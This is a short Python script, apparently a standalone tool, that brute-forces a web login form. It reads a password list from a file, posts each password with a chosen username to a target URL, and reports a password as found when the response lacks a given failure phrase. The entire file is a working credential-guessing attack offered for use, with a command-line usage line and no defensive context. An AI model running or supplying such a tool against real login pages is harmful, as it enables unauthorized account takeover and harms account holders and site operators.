import os
import sys
from time import sleep
import requests

class Cracker():
    def __init__(self, url, file, login, submit, params_names, fail_phrase):
        self.submit = submit
        self.url = url
        self.fail = fail_phrase
        self.file_name = file
        if os.path.exists(file):
            # Read data from file
            self.passes = self.read_data(self.file_name)
            print("Data correctly loaded!")
            print(self.passes)

            self.login = login
            if len(login) == 0:
                print("Login not specified!")
                sys.exit()

            # Prepare data to send
            try:
                self.data = []
                for pas in self.passes:
                    self.data.append((params_names[0], self.login, params_names[1], pas, params_names[2], self.submit))
                print("Data correctly prepared!")
                print(self.data)


            except IndexError:
                print("Params names specified incorrectly")
                sys.exit()

            # Send data to server
            for index, single_data in enumerate(self.data):
                print(f"[ {index+1}/{len(self.passes)} ] Sending ", single_data, "for", self.url)
                if self.send(self.url, single_data, self.fail):
                    print("Password found!")
                    print("Login:", self.login)
                    print("Password:", single_data[3])

        else:
            print("File could not be found!")
            sys.exit()


    def read_data(self, filename):
        with open(filename, 'r') as f:
            lines = f.read().split('\n')
            return lines

    def send(self, url, data, fail):
        ready_data = {data[0]: data[1], data[2]: data[3], data[4]: data[5]}
        r = requests.post(url=url, data=ready_data)
        if fail in r.text:
            return False
        else:
            return True

try:
    URL = sys.argv[1]
    PASS = sys.argv[2]
    LOGIN = sys.argv[3]
    BUTTON_VALUE = sys.argv[4]
    PARAMS_NAMES = sys.argv[5].split('?')
    FAIL = sys.argv[6]
    cracker = Cracker(URL, PASS, LOGIN, BUTTON_VALUE, (PARAMS_NAMES[0], PARAMS_NAMES[1], PARAMS_NAMES[2]), FAIL)
except IndexError:
    print("Usage: python script.py <url> <path_to_file_with_passes> <login> <submit_button_value> <post_of_login/username?password?submit_button, separeted with '?' <fail_phrase>")
